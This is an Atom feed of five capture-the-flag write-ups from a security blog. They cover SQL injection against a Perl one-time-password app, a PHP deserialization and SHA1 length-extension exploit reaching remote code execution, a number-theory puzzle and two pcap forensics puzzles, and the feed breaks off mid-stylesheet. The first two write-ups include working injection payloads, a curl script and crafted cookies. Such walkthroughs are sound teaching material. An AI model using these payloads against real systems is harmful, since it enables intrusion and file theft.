<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | The Swappage Playground]]></title>
  <link href="http://swappage.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://swappage.github.io/"/>
  <updated>2014-12-24T18:35:30+01:00</updated>
  <id>http://swappage.github.io/</id>
  <author>
    <name><![CDATA[Swappage]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Advent 2014 Day 21 : Otp]]></title>
    <link href="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/"/>
    <updated>2014-12-24T18:26:40+01:00</updated>
    <id>http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp</id>
    <content type="html"><![CDATA[<p>otp was a nice (and painful) web challenge in the advent calendar CTF 2014.</p>

<p>We were provided with the source code of the web application and with an URL: the objective was to successfully login to the web site to get the flag.</p>

<!-- more -->

<p>&#8220;`perl
#!/usr/bin/env perl
use Mojolicious::Lite;
use DBI;</p>

<p>my $dbh = DBI-&gt;connect(
    ‘dbi:SQLite:dbname=./otp.db’, ‘’, ‘’,
    +{
        RaiseError     =&gt; 1,
        sqlite_unicode =&gt; 1,
    }
);
app-&gt;helper(dbh =&gt; sub { $dbh });</p>

<p>get ‘/’ =&gt; sub {
    my $c = shift;
    my ($token, $pass) = gen_otp();
    my $expire = time() + 10;
    $c-&gt;dbh-&gt;do(‘INSERT INTO otp VALUES (?, ?, ?)’, undef, $token, $pass, $expire);
    $c-&gt;render(‘index’, token =&gt; $token);
};</p>

<p>post ‘/’ =&gt; sub {
    my $c = shift;
    my $token = $c-&gt;req-&gt;param(‘token’);
    # tiny firewall, but powerful :P
    if ($token =~ /sqlite/i) {
        $c-&gt;render(‘error’, message =&gt; “no hack.”);
        return;
    }
    my $time = time();
    my ($expire) = $c-&gt;dbh-&gt;selectrow_array(
        “SELECT ###CENSORED### FROM otp WHERE ###CENSORED### = ‘$token’ AND ###CENSORED### &lt; $time”,
    );
    if ($expire) {
        $c-&gt;render(‘error’, message =&gt; “otp expired at $expire”);
    } else {
        my $pass = $c-&gt;req-&gt;param(‘pass’);
        my ($ok) = $c-&gt;dbh-&gt;selectrow_array(
            ‘SELECT 1 FROM otp WHERE ###CENSORED### = ? AND ###CENSORED### = ?’, undef, $token, $pass,
        );
        $c-&gt;render(‘auth’, ok =&gt; $ok);
    }
    $c-&gt;dbh-&gt;do(
        ‘DELETE FROM otp WHERE ###CENSORED### = ?’, undef, $token
    );
};</p>

<p>sub gen_otp {
    open my $fh, ‘&lt;:raw’, ‘/dev/urandom’ or die $!;
    read $fh, my $token, 8;
    $token = unpack ‘H<em>’, $token;
    read $fh, my $pass, 16;
    $pass = unpack ‘H</em>’, $pass;
    return ($token, $pass);
}</p>

<p>app-&gt;start;
<strong>DATA</strong></p>

<p>@@ index.html.ep
% layout ‘default’;
% title ‘OTP’;</p>

<form method="POST">
  <input type="hidden" name="token" value="&lt;%= $token %&gt;" />
  <input type="text" name="pass" />
  <input type="submit" value="auth" />
</form>

<p>@@ auth.html.ep
% layout ‘default’;
% title ‘Authentication | OTP’;</p>

<p>% if ($ok) {</p>
<p>authentication succeeded.<br />the flag is: ###CENSORED###</p>
<p>% } else {</p>
<p>authentication failed.</p>
<p>% }</p>

<p>@@ error.html.ep
% layout ‘default’;
% title ‘Error | OTP’;</p>

<p>&lt;%= $message %&gt;</p>

<p>@@ layouts/default.html.ep
&lt;!DOCTYPE html&gt;</p>
<html>
  <head>
    <title>&lt;%= title %&gt;</title>
  </head>
  <style>
body, input {
  color: #fff;
  background: #333;
  font-family: monospace;
  font-size: 150%;
}
.container {
  width: 100%;
  margin-top: 50px;
  text-align: center;
}
  </style>
  <body>
<div class="container">
&lt;%= content %&gt;
</div>
  </body>
</html>

<p>&#8220;`</p>

<p>To log in the web application we need to submit a password, paired with the token we are provided as an hidden field in the form, and this pair of credentials is valid for 10 seconds: if the token has expired we won’t be able to log in, so what we need to do is to find a way to generate a token and exfiltrate the password generated by the application for that specific token, before it expires.</p>

<p>As it’s possible to observe from the source code, the query at line 31 is dynamic, so it’s possible to perform a SQL injection attack against the application.</p>

<p>By sending a tampered token value in the POST request, it’s possible to notice that we are facing a union based injection attack: infact if we send something like this:</p>

<pre><code>token=' UNION SELECT 1;
</code></pre>

<p>we would be presented with the following output in the web page</p>

<p><code>html
	&lt;p&gt;otp expired at 1&lt;/p&gt;
</code></p>

<p>It would at this point be easy to enumerate the database structure, tables and columns to exfiltrate some valid data, but it would have been too easy; at line 25 we can see</p>

<p><code>perl
	    if ($token =~ /sqlite/i) {
        $c-&gt;render('error', message =&gt; "no hack.");
        return;
    }
</code></p>

<p>which makes this challenge a real pain. Infact, as the comment suggets, this is a really tiny yet powerful firewall, because to enumerate the database, we’d need to access the sqlite_master table, where metadata about table structure are stored, but guess what? this is filtered and we cant.</p>

<p>So, no table enumeration: we need to find an alternative way to exfiltrate a valid password to log in.</p>

<p>I’m not that good at sql injection attacks, and in fact it took me a while to figure this out, but after a lot of trial and error i learned that column names are not needed to read data from them</p>

<p>I’ve tried the following injection query and eventually it resulted in the last generated password correctly exfiltrated.</p>

<pre><code>token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);
</code></pre>

<p><code>html
	&lt;p&gt;otp expired at 1bffa01d220d8d69f102dc08b07ba199&lt;/p&gt;
</code></p>

<p>now all i needed was to be fast enaugh to exfiltrate a valid password and login within 10 seconds.</p>

<p>bash and curl came to the rescue, i put togeder this dirty and terrible script that helped me to login and get the flag</p>

<p>&#8220;`bash
	#!/bin/bash</p>

<pre><code>TOKEN=$(curl http://otp.adctf2014.katsudon.org | grep input | grep token | awk -F '"' '{print $6}')
PASS=$(curl http://otp.adctf2014.katsudon.org -d "token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);&amp;pass=" | grep expired | awk -F ' ' '{print $4}' | awk -F '&lt;' '{print $1}')

echo $TOKEN
echo $PASS

curl http://otp.adctf2014.katsudon.org -d "token=$TOKEN&amp;pass=$PASS" ```
</code></pre>

<p>&#8220;`html</p>
<p>authentication succeeded.<br />the flag is: ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5</p>
<p>&#8220;`</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Tick Tock]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock/"/>
    <updated>2014-11-08T21:49:30+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-tick-tock</id>
    <content type="html"><![CDATA[<p>Math, math, and more math! :)</p>

<p>There was a loth of math in this picoCTF, and Tick Tock was a pretty cool one.</p>

<p>The problem was under the reverse engineering category, but it was definitely mor math related then reverse engineering, as all you had to understand in terms of verersing, was what the python script was doing.</p>

<!-- more -->

<p>If we remove all the visualization stuff, for spinning the clock all the problem revolves around these functions</p>

<p><code>python
	def count(n,m,msg=""):
	  # n % m
	  spin_for = min((m*10),n)
	  nspots = 112
	  for i in xrange(0,spin_for,m/nspots+1):
		speed = 1.0/((spin_for-i)/(m/nspots+1)+1)
		printc(clock(1+i+n-spin_for,m),msg)
		time.sleep(speed)
	  if m/nspots+1 &gt; 2:
		for j in xrange(i,spin_for,max((spin_for-i)/50,1)):
		  printc(clock(1+j+n-spin_for,m),msg)
	  printc(clock(n,m),msg)
	  return n%m
</code></p>

<p>the count() function: that is nothing but a modulus operation with some ascii art :)</p>

<p><code>python
	def powmod(n,p,m,msg=""):
	  # n^p % m
	  for i in xrange(max(0,p-100),p+1):
		speed = 1.0/math.sqrt(1+p-i)
		printc(clock(pow(n,i,m),m),msg)
		time.sleep(speed)
	  return pow(n,p,m)
</code></p>

<p>and the powmod() function: which is nothing but a pow, again with some graphics for displaying the clock.</p>

<p>then the application does the following:</p>

<p>it takes the first argument number we supply, it takes the list named secretz, containing 17 tuples</p>

<p><code>python
	secretz = [(1, 2), (2, 3), (8, 13), (4, 29), (130, 191), (343, 397), (652, 691), (858, 1009),
           (689, 2039), (1184, 4099), (2027, 7001), (5119, 10009), (15165, 19997), (15340, 30013),
           (29303, 70009), (42873, 160009), (158045, 200009)]
</code></p>

<p>and cycles over each tuple using the count() function, which as said earlier is nothing but a modulus operation.</p>

<p><code>python
	for (r,m) in secretz:
	  if count(num,m,"%d %% %d"%(num,m)) != r:
		print
		print "%d %% %d != %d... WRONG"%(num,m,r)
		sys.exit(0)
	  else:
		print
		print "%d %% %d == %d... GOOD"%(num,m,r)
		time.sleep(2)
		print '\033[2A'
		print " "*90
</code></p>

<p>it performs the modulus operation between the number we supplied and the second value of the tuple, and checks that the result of the operation matches the first value, if the result is correct it procedes to the next tuple, if it fails, it exits.</p>

<p>for example, if we assume that x is the first argument we submitted it checks that the following statement is true</p>

<script type="math/tex; mode=display">
\begin{align}
x \equiv 1 \pmod{2}
\end{align}
</script>

<p>and if it is, it performs the check for the next tuple.</p>

<p>So the first part of the problem was to find a value x that would satisfy the equivalence for every tuple in the secretz list.</p>

<p>This problem can be solved using the <em>chinese residiant theorem</em>
which can be implemented in python as follows:</p>

<p>&#8220;`python
	#!/usr/bin/python</p>

<pre><code>def mul_inv(a, b):
	b0 = b
	x0, x1 = 0, 1
	if b == 1: return 1
	while a &gt; 1:
		q = a / b
		a, b = b, a%b
		x0, x1 = x1 - q * x0, x0
	if x1 &lt; 0: x1 += b0
	return x1
 
def chinese_remainder(n, a, lena):
	p = i = prod = 1; sm = 0
	for i in range(lena): prod *= n[i]
	for i in range(lena):
		p = prod / n[i]
		sm += a[i] * mul_inv(p, n[i]) * p
	return sm % prod
 
if __name__ == '__main__':
	n = [2, 3, 13, 29, 191, 397, 691, 1009, 2039, 4099, 7001, 10009, 19997, 30013, 70009, 160009, 200009]
	a = [1, 2, 8, 4, 130, 343, 652, 858, 689, 1184, 2027, 5119, 15165, 15340, 29303, 42873, 158045]
	c = chinese_remainder(n, a, len(n))
	print c ```
</code></pre>

<p>Once we find the number that satisfies the first part of the problem, the second function comes in play</p>

<p><code>python
	if powmod(num,num2,200009*160009,"%d ^ %d %% %d"%(num,num2,200009*160009)) != 1:
	  print
	  print "%d ^ %d %% %d != 1... WRONG"%(num,num2,200009*160009)
	  sys.exit(0)
	else:
	  print "Congratulations! The flag is: %s_%s"%(sys.argv[1],str(num2))
</code></p>

<p>and what happens here is that the last two modulus operand of the secretz list, are multiplied one another and used as a modulus to compute the following equation</p>

<script type="math/tex; mode=display">
\begin{align}
x^y \equiv 1 \pmod{N}
\end{align}
</script>

<p>where </p>

<ul>
  <li>x is our first argument</li>
  <li>y is our second argument</li>
  <li>and N is the number obtained by the multiplication said above</li>
</ul>

<p>Solving this second part is easy, because there is the <em>Euler’s theorem</em> stating</p>

<script type="math/tex; mode=display">
\begin{align}
a^{\phi(N)} \equiv 1 \pmod{N}
\end{align}
</script>

<p>so.. Walfram Alfa to the rescue!</p>

<p>let’s calculate <script type="math/tex">\phi(N)</script> as this will give us the correct value to submit to the program as second parameter.</p>

<p>Unfortunately the clock script was buggy, and during the last step returned an exception, but in the end the calculated numbers were correct, and scored the flag successfully on the web site.</p>

<pre><code>83359654581036155008716649031639683153293510843035531_32002880064
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Steve's List]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list/"/>
    <updated>2014-11-08T21:05:49+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list</id>
    <content type="html"><![CDATA[<p>Steve’s List was a 200 points master challenge mostly focused on web exploitation, but also with a little of crypto inside.</p>

<p>The problem stated</p>

<p><img class="center" src="/images/2014-11-08_stevelist/problem.png"></p>

<p>So we were playing with a defaced website, we had the web server, a backup archive containing the source for a white box analysis and a flag to read.</p>

<!-- more -->

<p>I started looking at the source code, and a couple of things turned out looking really interesting.</p>

<p>Let’s start with the cookie.php page, which is the page that actually has the vuln:</p>

<p><code>php
	&lt;?php
	  if (isset($_COOKIE['custom_settings'])) {
		// We should verify to make sure this thing is legit.
		$custom_settings = urldecode($_COOKIE['custom_settings']);
		$hash = sha1(AUTH_SECRET . $custom_settings);
		if ($hash !== $_COOKIE['custom_settings_hash']) {
		  die("Why would you hack Section Chief Steve's site? :(");
		}
		// we only support one setting for now, but we might as well put this in.
		$settings_array = explode("\n", $custom_settings);
		$custom_settings = array();
		for ($i = 0; $i &lt; count($settings_array); $i++) {
		  $setting = $settings_array[$i];
		  $setting = unserialize($setting);
		  $custom_settings[] = $setting;
		}
	  } else {
		$custom_settings = array(0 =&gt; true);
		setcookie('custom_settings', urlencode(serialize(true)), time() + 86400 * 30, "/");
		setcookie('custom_settings_hash', sha1(AUTH_SECRET . serialize(true)), time() + 86400 * 30, "/");
	  }
	?&gt;
</code></p>

<p>As we can see, the vuln here is pretty clear: there is a deserialization of an object that is specified in a cookie value.
What happens here is that the value of the cookie is splitted on the “\n” character, and each value is put in an array and then the function unserialize() is invoked on that value.</p>

<p>As we will see later, this will allow us to gain remote code execution on the server, but unfortunately, for now there is something really annoying that is preventing us from reaching the exploitable branch of code.</p>

<p>In fact at line 5 the cookie value is appended to an AUTH_SECRET value, and a sha1 hash of the resulting concatenation is checked against another cookie, named custom_settings_hash
which is set the first time we visit the site by the code from line from 19 to 21 of the cookie.php page.</p>

<p>the AUTH_SECRET value is statically defined in another php page, where all the static variables are set: root_data.php</p>

<p><code>php
	&lt;?php
	  define('STEVES_LIST_ABSOLUTE_INCLUDE_ROOT', dirname(__FILE__) . "/");
	  define('STEVES_LIST_TEMPLATES_PATH', dirname(__FILE__) . "/templates/");
	  define('DISPLAY_POSTS', 0);
	  // Daedalus changed this... I guess AAAAAAAA was not a good secret :(
	  define('AUTH_SECRET', "AAAAAAAA");
	  require_once(STEVES_LIST_ABSOLUTE_INCLUDE_ROOT . "includes/classes.php");
	?&gt;
</code></p>

<p>In our local backup, the static value is set to AAAAAAAA, but on the remote server the “hackers” from daedalus corp modified that value to prevent us from taking back the control of the web site.</p>

<p>And here is where crypto comes in play: yes, because there is an attack. known as <em>length extension attack</em> that allows us to bypass the above verification issue.</p>

<p>The attack can be performed with all the hashes where the function is H(secret.message) and where the message and the length of the secret are known.</p>

<p>We know already that the value of AUTH_SECRET is fixed to 8 characters, so we can abuse the length extension attack to append extra data to the custom_settings cookie.</p>

<p>Before performing this attack, we were bound to a fixed value in the custom_settings cookie, that was</p>

<pre><code>b:1;
</code></pre>

<p>which is the serialization of a true statement</p>

<p><code>php
	serialize(true)
</code></p>

<p>but now we can predict the hash that will result by padding that value and appending extra data, so we can append a \n followed by another serialized object that would eventually be deserialized after the check was successfully passed.</p>

<p>Using a python library for implementing the Length extension attack: hlextend i was able to build a simple payload that would bypass the validation; for now let’s be happy i was able to inject test.</p>

<p><img class="center" src="/images/2014-11-08_stevelist/hashbypass.png"></p>

<p>Once the problem of bypassing the hash validation was solved, I had to find a way to gain code execution.
Doing that on the remote server would have been a little too much of a frustration, so i decided to create a local instance using the website backup, and by tweaking the code a bit, try to build a working object that would allow to gain code execution.</p>

<p>after looking at the source code of the class.php a little closer, I found that the Post class would be the perfect object to serialize and inject; </p>

<p>&#8220;`php
	class Post {
		protected $title;
		protected $text;
		protected $filters;
		function __construct($title, $text, $filters) {
			$this-&gt;title = $title;
			$this-&gt;text = $text;
			$this-&gt;filters = $filters;
	}</p>

<p>&#8220;`</p>

<p>the class accepts 3 parameters in the constructor</p>

<ul>
  <li>title</li>
  <li>text</li>
  <li>filter</li>
</ul>

<p>where title is a string, text is also a string, while filter is an array of objects from the Filter class.</p>

<p><code>php
	class Filter {
		protected $pattern;
		protected $repl;
		function __construct($pattern, $repl) {
		  $this-&gt;pattern = $pattern;
		  $this-&gt;repl = $repl;
		}
		function filter($data) {
		  return preg_replace($this-&gt;pattern, $this-&gt;repl, $data);
		}
	};
</code></p>

<p>And how convenient, because the Filter class makes a good use of the preg_replace() function! This is really good, because considering we are in control of the object, we can forge the regular expressions for the Filter object, and this allows us, to create a regexp that instead of replacing, would execute our substitution payload.</p>

<p>To build the object i created this simple PHP snipplet:</p>

<p>&#8220;`php
&lt;?php</p>

<p>class Filter {
    protected $pattern;
    protected $repl;</p>

<pre><code>function __construct($pattern, $repl) {
  $this-&gt;pattern = $pattern;
  $this-&gt;repl = $repl;
}
function filter($data) {
  return preg_replace($this-&gt;pattern, $this-&gt;repl, $data);
}
</code></pre>

<p>}</p>

<p>$filterobject = [new Filter(“/test/e”, “system(‘cat /etc/passwd’);”)];</p>

<p>class Post
{
   protected $title = “test”;
   protected $text = “test”;
   protected $filters;</p>

<p>function __construct() {
        global $filterobject;
        $this-&gt;filters = $filterobject;
   }</p>

<p>}</p>

<p>print  “\n”.serialize(new Post));
&#8220;`</p>

<p>saved the output to a file (because the serialized objects may contain non printable characters
URL encoded it, and tried to send it to my local server.</p>

<p>The result was the following</p>

<p><img class="center" src="/images/2014-11-08_stevelist/injected.png"></p>

<p>Ok, now i had an object that would allow me to execute arbitrary code on the remote server.</p>

<p>I replaced the payload with a cat /home/daedalus/flag.txt and used the following python snipplet to calculate the hash and produce proper padding</p>

<p>&#8220;`python
	#!/usr/bin/python</p>

<pre><code>import sys
import struct
import hlextend
import urllib

object = ""

with open("rawcookie.bin", "rb") as f:
	byte = f.read(1)
	while byte != "":
		object += byte
		byte = f.read(1)

print object

sha = hlextend.new('sha1')

meh = sha.extend(object, 'b:1;', 8, '2141b332222df459fd212440824a35e63d37ef69')

print meh

print sha.hexdigest() ```
</code></pre>

<p>here is an hex representation of the custom_settings cookie without URL encoding</p>

<pre><code>00000000  0a 4f 3a 34 3a 22 50 6f  73 74 22 3a 33 3a 7b 73  |.O:4:"Post":3:{s|
00000010  3a 38 3a 22 00 2a 00 74  69 74 6c 65 22 3b 73 3a  |:8:".*.title";s:|
00000020  34 3a 22 74 65 73 74 22  3b 73 3a 37 3a 22 00 2a  |4:"test";s:7:".*|
00000030  00 74 65 78 74 22 3b 73  3a 34 3a 22 74 65 73 74  |.text";s:4:"test|
00000040  22 3b 73 3a 31 30 3a 22  00 2a 00 66 69 6c 74 65  |";s:10:".*.filte|
00000050  72 73 22 3b 61 3a 31 3a  7b 69 3a 30 3b 4f 3a 36  |rs";a:1:{i:0;O:6|
00000060  3a 22 46 69 6c 74 65 72  22 3a 32 3a 7b 73 3a 31  |:"Filter":2:{s:1|
00000070  30 3a 22 00 2a 00 70 61  74 74 65 72 6e 22 3b 73  |0:".*.pattern";s|
00000080  3a 37 3a 22 2f 74 65 73  74 2f 65 22 3b 73 3a 37  |:7:"/test/e";s:7|
00000090  3a 22 00 2a 00 72 65 70  6c 22 3b 73 3a 33 38 3a  |:".*.repl";s:38:|
000000a0  22 73 79 73 74 65 6d 28  27 63 61 74 20 2f 68 6f  |"system('cat /ho|
000000b0  6d 65 2f 64 61 65 64 61  6c 75 73 2f 66 6c 61 67  |me/daedalus/flag|
000000c0  2e 74 78 74 27 29 3b 22  3b 7d 7d 7d              |.txt');";}}}|
</code></pre>

<p>the resulting cookies content for the submission to the vulnerable page were respectively:</p>

<pre><code>custom_settings_hash: 13c0bac46fcbd453c5052bce1d2f9ad6c88fe2bc

vustom_settings: b:1%3b%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A4%3A%22test%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A4%3A%22test%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A7%3A%22%2Ftest%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A38%3A%22system%28%27cat+%2Fhome%2Fdaedalus%2Fflag.txt%27%29%3B%22%3B%7D%7D%7D
</code></pre>

<p>and they resulted in the flag being correctly retrieved</p>

<p><img class="center" src="/images/2014-11-08_stevelist/flag.png"></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF Finals 2014: Important Day]]></title>
    <link href="http://swappage.github.io/blog/2014/10/23/asis-ctf-finals-2014-important-day/"/>
    <updated>2014-10-23T20:32:08+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/23/asis-ctf-finals-2014-important-day</id>
    <content type="html"><![CDATA[<p>Important Day was a 100 points challenge where you were provided with a pcap file, and asked to determine when the system was powered on.</p>

<p>By looking at the pcap file it really looked like a portscan, and by a quick google search i ran into a post from back in 2006 on seclists.org discussing about the possibility to guess the time of the last system reboot, by looking at the TCP protocol TSVAL option.
<!-- more --></p>

<p><img class="center" src="/images/2014-10-23/scan.png"></p>

<p>Bsically since the TSVAL counter is reset to zero every time the system reboots (at least on many OSes), if you know the frequency at which TSVAL is increased, you can try to guess the boot timestamp.</p>

<p>As the challenge was providing a pcap, we had the capture timestamp, so if we had enaugh TSVAL options to compare, we could try to guess the system uptime.</p>

<p>The tickrate at which TSVAL increases is different from Operating System to Operating System, and with only the pcap i didn’t know the  target OS, but i had multiple packets to analyze, so it was probably a matter of math.</p>

<p>I decided to set the following filter</p>

<pre><code>tcp.options.timestamp.tsval &amp;&amp; ip.src == 192.168.100.78
</code></pre>

<p>so that i could get only the packets having the tsval option field set, and coming from the target system (not the stanning one)</p>

<p><img class="center" src="/images/2014-10-23/filtered.png"></p>

<p>And then analyzed how the TSVAL increased compared to the milliseconds in the packet capture timestamp.</p>

<p>By picking packets number number 4034 and 4039 we can notice:</p>

<pre><code>4034: Timestamp in ms: 1412157739276	TSVAL: 2400803286
4039: Timestamp in ms: 1412157739438	TSVAL: 2400803327
</code></pre>

<p>So with some simple math</p>

<pre><code>1412157739438 - 1412157739276 = 162
2400803327 - 2400803286 = 41
</code></pre>

<p>we can figure out that TSVAL increases by 1 tick every ~4ms</p>

<p>Ok, awesome
So now if our assumption was correct, we need to figure out what was the timestamp when TSVAL was 0:</p>

<p>so with some other simple math we discover</p>

<pre><code>(1412157739438 - 2400803327 * 4) / 1000= 1402554526.130
</code></pre>

<p>This timestamp corresponds to Thu, 12 Jun 2014 06:28:46 GMT</p>

<p>The flag was in the format of md5(ASIS_date) where date was in the format “%Y:%m:%d:%H:%M”</p>

<p>A quick conversion did the trick</p>

<p><code>python
	&gt;&gt;&gt; print(datetime.datetime.fromtimestamp(1402554526).strftime("%Y:%m:%d:%H:%M"))
	2014:06:12:10:58
</code></p>

<p>And at this point you’d say: <strong>“Wait, what’s this?, why 10:58?”</strong></p>

<p>And that’s the good point, and the fact that really disappointed me, as i spent <em>a lot of time</em> with trial and error thinking i was doing things wrong, when at  a certain point, with all the frustration i had accumulated, i went on the CTF IRC channel asking an admin if something was broken, and then he pointed out that i was supposed to provide the date in IRST timezone.</p>

<p>I mean, WHAT? are you kidding me? timestamps in forensics not in UTC? come on, please, guess what would happen if you were to ask logs to an ISP for a specific IP address at a certain timestamp not in UTC.. you might send an innocent on trial because of that.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SU-CTF 2014: Personalized Captcha]]></title>
    <link href="http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha/"/>
    <updated>2014-10-09T22:09:39+02:00</updated>
    <id>http://swappage.github.io/blog/2014/10/09/su-ctf-2014-personalized-captcha</id>
    <content type="html"><![CDATA[<p>Second CTF for the VulnHub team, and lots of fun with these puzzles.</p>

<p>This writeup is all about an interesting forensics and web game named “Personalized captcha” where the players were challenged to discover the value of a captcha string by analizing a provided pcap file.</p>

<!-- more -->

<p>The pcap file was ~9MB in size, which is not big, but for sure bigger then usual for a CTF puzzle, and by a first look at it using wireshark it looked fairly messy, especially in terms of HTTP traffic, considering that a fairly good amount of HTTP requests and streams where in there.</p>

<p>Sorting things out by hand would have been fairly challenging, and when playing a CTF, you really have to be as fast as possible, so i decided to rely on a NFAT (Network forensics analysis tool) named Xplico, available in kali for dissecting it.</p>

<p>This tool is excellent for dissecting even big (100MB+) pcap files, and has really powerful filtering and search features, especially when you need to rebuild content for analysis, like web pages, images, audio files, voip communications and so on.</p>

<p><img class="center" src="/images/2014-10-09/packet_summary.png"></p>

<p>Punching the pcap into the software made things clearer and more understandable then by simply looking at raw packets in wireshark, and in the first place i started looking at the sites the user visited.</p>

<p>The challenge hinted the players about the domain <em>captcha.ctf.sharif.edu</em> being down, which of course dragged me into digging more in depth about anything that i could find in the pcap about that domain.</p>

<p><img class="center" src="/images/2014-10-09/sharif_captcha.png"></p>

<p>A quick search revealed that the user for whom we were trying to rebuild the captcha actually visited that site; i focused some effort in dissecting the communications between the user and the server, i went sure on a post request that seemed interesting but unfortunately the user never really submitted the captcha, so, unfortunately, not a chance to grab it from the POST request, even if it wasn’t encrypted.</p>

<p><img class="center" src="/images/2014-10-09/post.png"></p>

<p>Well, in the end this was a 300 points worth puzzle, wouldn’t it be too easy that way?</p>

<p>Anyway, back to the challenge, at this point it was probably a good idea to try to rebuild the pages content.</p>

<p>Xplico in these things really rocks the world, because it can preview the content of web pages by rebuilding them entirely off a pcap file, i tried previewing the page as i usually do, but this time something went wrong.</p>

<p><img class="center" src="/images/2014-10-09/badpage.png"></p>

<p>For the good actually, because this helped me in understanding the point of the puzzle (more on this later), but the page looked really weird, by quickly inspecting the source, I noticed that 2 CSS files were included in the html, but if we look at them in Xplico we can notice that the <em>style.css</em> was 0 bytes in size.</p>

<p><code>html
	&lt;!doctype html&gt;
	&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;The Captcha&lt;/title&gt;
		&lt;link rel="stylesheet" href="css/bootstrap.css"&gt;
		&lt;link rel="stylesheet" href="css/style.css"&gt;
	&lt;/head&gt;
	&lt;body&gt;
	...
	&lt;/body&gt;
	&lt;/html&gt;
</code></p>

<p><img class="center" src="/images/2014-10-09/wrongsize.png"></p>

<p>mhh.. odd isn’t it? i double checked using wireshark and it actually resulted that something DID went wrong in pcap dissection by Xplico, did the challenge author know something i didn’t? was this done on purpose?</p>

<p>Yet, wireshark revealed the truth and at this point i decided to export the files directly from wireshark and restore their original paths so that the page would display properly; luckly wireshark provides an awesome feature to export files from HTTP strams, so it was just a matter of a couple of mouse clicks to get everything i needed.</p>

<p>Opening the web page in the browser revealed what was the page as it appeared to the user whom this traffic capture belonged to</p>

<p><img class="center" src="/images/2014-10-09/wholepage.png"></p>

<p>except for the fact, that the captcha was empty.</p>

<p>Yet, pieces of the puzzle were starting to make sense if put togeder; now i had a captcha field, but where are the links that i could see without the <em>style.css</em>?</p>

<p>Let’s take a look at the whole page code</p>

<p>&#8220;`html
	&lt;!doctype html&gt;
	&lt;html&gt;
	&lt;head&gt;
		<meta charset="UTF-8" />
		<title>The Captcha</title>
		<link rel="stylesheet" href="css/bootstrap.css" />
		<link rel="stylesheet" href="css/style.css" />
	&lt;/head&gt;
	&lt;body&gt;
	&lt;div class=&#8221;container&#8221;&gt;
		&lt;div class=&#8221;row&#8221;&gt;
			&lt;div class=&#8221;col-xs-8 col-xs-offset-2 col-md-6 col-md-offset-3&#8221;&gt;
				&lt;form method=&#8221;post&#8221;&gt;
					<textarea class="form-control mb5" placeholder="comment" name="comment"></textarea>
					<input type="text" class="form-control mb5" placeholder="captcha" name="captcha" /></p>

<pre><code>				&lt;div id="captcha"&gt;
					&lt;a href="http://en.wikipedia.org/wiki/Hack"&gt;P&lt;/a&gt;
					&lt;a href="http://wordpress.org/plugins/captcha/"&gt;E&lt;/a&gt;
					&lt;a href="http://wordpress.org/mobile/"&gt;A&lt;/a&gt;
					&lt;a href="http://captchas.net/"&gt;C&lt;/a&gt;
					&lt;a href="http://en.wikipedia.org/wiki/Hack"&gt;E&lt;/a&gt;

					&lt;a href="http://www.thefreedictionary.com/hack"&gt;Y&lt;/a&gt;
					&lt;a href="http://www.php.net/manual/en/security.database.sql-injection.php"&gt;E&lt;/a&gt;
					&lt;a href="http://www.unixwiz.net/techtips/sql-injection.html"&gt;T&lt;/a&gt;

					&lt;a href="http://www.google.com/recaptcha/intro/index.html"&gt;V&lt;/a&gt;
					&lt;a href="http://en.wikipedia.org/wiki/OWASP"&gt;U&lt;/a&gt;
					&lt;a href="http://www.phpcaptcha.org/documentation/quickstart-guide/"&gt;L&lt;/a&gt;

					&lt;a href="http://www.merriam-webster.com/dictionary/hack"&gt;A&lt;/a&gt;
					&lt;a href="http://www.urbandictionary.com/define.php?term=hack"&gt;N&lt;/a&gt;
					&lt;a href="http://www.hackthissite.org/"&gt;D&lt;/a&gt;

					&lt;a href="http://www.phpcaptcha.org/posts/wordpress-plugin-released/"&gt;A&lt;/a&gt;

					&lt;a href="http://en.wiktionary.org/wiki/hack"&gt;H&lt;/a&gt;
					&lt;a href="http://www.captcha.net/"&gt;A&lt;/a&gt;
					&lt;a href="http://captchas.net/sample/php/"&gt;C&lt;/a&gt;
					&lt;a href="http://www.phpcaptcha.org/download/wordpress-plugin/"&gt;K&lt;/a&gt;
				&lt;/div&gt;
				&lt;button type="submit" class="btn btn-primary btn-block"&gt;send&lt;/button&gt;
			&lt;/form&gt;
		&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt; ``` and at the *style.css*
</code></pre>

<p><code>css
	#captcha {
